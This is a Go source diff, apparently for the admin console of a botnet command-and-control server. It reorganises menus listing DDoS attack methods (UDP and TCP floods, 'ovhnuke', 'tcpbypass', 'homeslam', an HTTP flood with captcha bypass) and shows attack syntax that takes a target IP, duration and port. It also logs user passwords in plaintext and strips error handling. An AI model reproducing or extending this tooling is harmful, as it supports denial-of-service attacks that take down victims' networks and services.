@@ -66,7 +66,6 @@ func (this *Admin) Handle() {
 		log.SetFlags(log.LstdFlags)
 		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
 		if err != nil {
-			fmt.Println("Error: ", err)
 		}
 		log.SetOutput(loginLogsOutput)
 		log.Printf("| successful login | username:%s | password:%s | ip:%s", username, password, this.conn.RemoteAddr())
@@ -132,36 +131,27 @@ func (this *Admin) Handle() {
 		if cmd == "HELP" || cmd == "help" || cmd == "?" {
 			this.conn.Write([]byte("\x1b[1;90m            --> | Help | <--     \r\n"))
 			this.conn.Write([]byte("\x1b[1;35m╔═════════════════════════════════════╗\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ layer3 \x1b[90m- \x1b[0mLayer 3 UDP Methods       \x1b[1;35m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ layer4 \x1b[90m- \x1b[0mLayer 4 TCP Methods       \x1b[1;32m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ layer7 \x1b[90m- \x1b[0mLayer 7 HTTP Methods       \x1b[1;35m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ special\x1b[90m- \x1b[0mSpecial Methods          \x1b[1;32m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ ports  \x1b[90m- \x1b[0mShows Ports                \x1b[1;35m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ admin  \x1b[90m- \x1b[0mShows Admin Commands      \x1b[1;32m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m╚═════════════════════════════════════╝\x1b[0m\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ layer4 \x1b[90m- \x1b[0mLayer 4 Methods           \x1b[1;35m║\x1b[0m\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m║ layer7 \x1b[90m- \x1b[0mLayer 7 HTTP Methods       \x1b[1;32m║\x1b[0m\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ special\x1b[90m- \x1b[0mSpecial Methods          \x1b[1;35m║\x1b[0m\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m║ ports  \x1b[90m- \x1b[0mShows Ports                \x1b[1;32m║\x1b[0m\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ admin  \x1b[90m- \x1b[0mShows Admin Commands      \x1b[1;35m║\x1b[0m\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m╚═════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
 
-		// Layer 3 (UDP) methods
-		if cmd == "LAYER3" || cmd == "layer3" || cmd == "L3" || cmd == "l3" || cmd == "UDP" || cmd == "udp" {
-			this.conn.Write([]byte("\x1b[1;90m                --> | Layer 3 (UDP) | <--\x1b[0m\r\n"))
+		// Layer 4 (UDP + TCP) methods
+		if cmd == "LAYER4" || cmd == "layer4" || cmd == "L4" || cmd == "l4" {
+			this.conn.Write([]byte("\x1b[1;90m                --> | Layer 4 | <--\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mudp\x1b[1;32m, \x1b[1;33mudpplain\x1b[1;32m, \x1b[1;33mstd\x1b[1;32m, \x1b[1;33mnudp\x1b[1;32m, \x1b[1;33mudphex\x1b[1;32m, \x1b[1;33msocket-raw\x1b[1;32m, \x1b[1;33mudp-strong\x1b[1;32m, \x1b[1;33mhex-flood\x1b[1;32m, \x1b[1;33mstrong-hex\x1b[1;32m         ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33movhudp\x1b[1;32m, \x1b[1;33mcudp\x1b[1;32m, \x1b[1;33micee\x1b[1;32m, \x1b[1;33mrandhex\x1b[1;32m, \x1b[1;33movh\x1b[1;32m, \x1b[1;33movhdrop\x1b[1;32m, \x1b[1;33mnfo\x1b[1;32m, \x1b[1;33msamp\x1b[1;32m                                 ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mUDP:\x1b[1;32m                                                                          ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mudp\x1b[1;32m, \x1b[1;33mudpplain\x1b[1;32m, \x1b[1;33mstd\x1b[1;32m, \x1b[1;33mnudp\x1b[1;32m, \x1b[1;33mudphex\x1b[1;32m, \x1b[1;33msocket-raw\x1b[1;32m, \x1b[1;33mudp-strong\x1b[1;32m, \x1b[1;33mhex-flood\x1b[1;32m, \x1b[1;33mstrong-hex\x1b[1;32m     ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33movhudp\x1b[1;32m, \x1b[1;33mcudp\x1b[1;32m, \x1b[1;33micee\x1b[1;32m, \x1b[1;33mrandhex\x1b[1;32m, \x1b[1;33movh\x1b[1;32m, \x1b[1;33movhdrop\x1b[1;32m, \x1b[1;33mnfo\x1b[1;32m, \x1b[1;33msamp\x1b[1;32m                             ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mTCP:\x1b[1;32m                                                                          ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mtcp\x1b[1;32m, \x1b[1;33msyn\x1b[1;32m, \x1b[1;33mack\x1b[1;32m, \x1b[1;33mstomp\x1b[1;32m, \x1b[1;33mhex\x1b[1;32m, \x1b[1;33mstdhex\x1b[1;32m, \x1b[1;33mxmas\x1b[1;32m, \x1b[1;33mtcpall\x1b[1;32m, \x1b[1;33mtcpfrag\x1b[1;32m, \x1b[1;33masyn\x1b[1;32m, \x1b[1;33musyn\x1b[1;32m          ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mackerpps\x1b[1;32m, \x1b[1;33mtcp-mix\x1b[1;32m, \x1b[1;33mtcpbypass\x1b[1;32m, \x1b[1;33mnfolag\x1b[1;32m, \x1b[1;33movhnuke\x1b[1;32m                                   ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mudp <ip> <time> dport=<port>\x1b[1;32m                                        ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
-			continue
-		}
-
-		// Layer 4 (TCP) methods
-		if cmd == "LAYER4" || cmd == "layer4" || cmd == "L4" || cmd == "l4" || cmd == "TCP" || cmd == "tcp" {
-			this.conn.Write([]byte("\x1b[1;90m                --> | Layer 4 (TCP) | <--\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mtcp\x1b[1;32m, \x1b[1;33msyn\x1b[1;32m, \x1b[1;33mack\x1b[1;32m, \x1b[1;33mstomp\x1b[1;32m, \x1b[1;33mhex\x1b[1;32m, \x1b[1;33mstdhex\x1b[1;32m, \x1b[1;33mxmas\x1b[1;32m, \x1b[1;33mtcpall\x1b[1;32m, \x1b[1;33mtcpfrag\x1b[1;32m, \x1b[1;33masyn\x1b[1;32m, \x1b[1;33musyn\x1b[1;32m              ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mackerpps\x1b[1;32m, \x1b[1;33mtcp-mix\x1b[1;32m, \x1b[1;33mtcpbypass\x1b[1;32m, \x1b[1;33mnfolag\x1b[1;32m, \x1b[1;33movhnuke\x1b[1;32m, \x1b[1;33mraw\x1b[1;32m                                         ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mtcp <ip> <time> dport=<port>\x1b[1;32m                                       ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
@@ -170,7 +160,7 @@ func (this *Admin) Handle() {
 		if cmd == "LAYER7" || cmd == "layer7" || cmd == "L7" || cmd == "l7" || cmd == "HTTP" || cmd == "http" {
 			this.conn.Write([]byte("\x1b[1;90m                --> | Layer 7 (HTTP) | <--\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mhttp\x1b[1;32m, \x1b[1;33mhttps\x1b[1;32m, \x1b[1;33mcf\x1b[1;32m                                                                      ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mhttp\x1b[1;32m, \x1b[1;33mhttps\x1b[1;32m, \x1b[1;33mcf\x1b[1;32m, \x1b[1;33mbrowserem\x1b[1;32m (includes captcha bypass)                      ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mcf <ip> <time> domain=<domain>\x1b[1;32m                                     ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
@@ -181,7 +171,7 @@ func (this *Admin) Handle() {
 		if cmd == "SPECIAL" || cmd == "special" || cmd == "SPEC" || cmd == "spec" {
 			this.conn.Write([]byte("\x1b[1;90m                --> | Special | <--\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mvse\x1b[1;32m, \x1b[1;33mdns\x1b[1;32m, \x1b[1;33mgreip\x1b[1;32m, \x1b[1;33mgreeth\x1b[1;32m                                                                  ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mvse\x1b[1;32m, \x1b[1;33mdns\x1b[1;32m, \x1b[1;33mgreip\x1b[1;32m, \x1b[1;33mgreeth\x1b[1;32m, \x1b[1;33mhomeslam\x1b[1;32m, \x1b[1;33mudpbypass\x1b[1;32m, \x1b[1;33mmixed\x1b[1;32m                          ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mdns <ip> <time>\x1b[1;32m                                                    ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
@@ -235,7 +225,6 @@ func (this *Admin) Handle() {
 			log.SetFlags(log.LstdFlags)
 			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
 			if err != nil {
-				fmt.Println("Error: ", err)
 			}
 			log.SetOutput(output)
 			log.Printf("| username:%s | command:%s | ip:%s", username, cmd, this.conn.RemoteAddr())
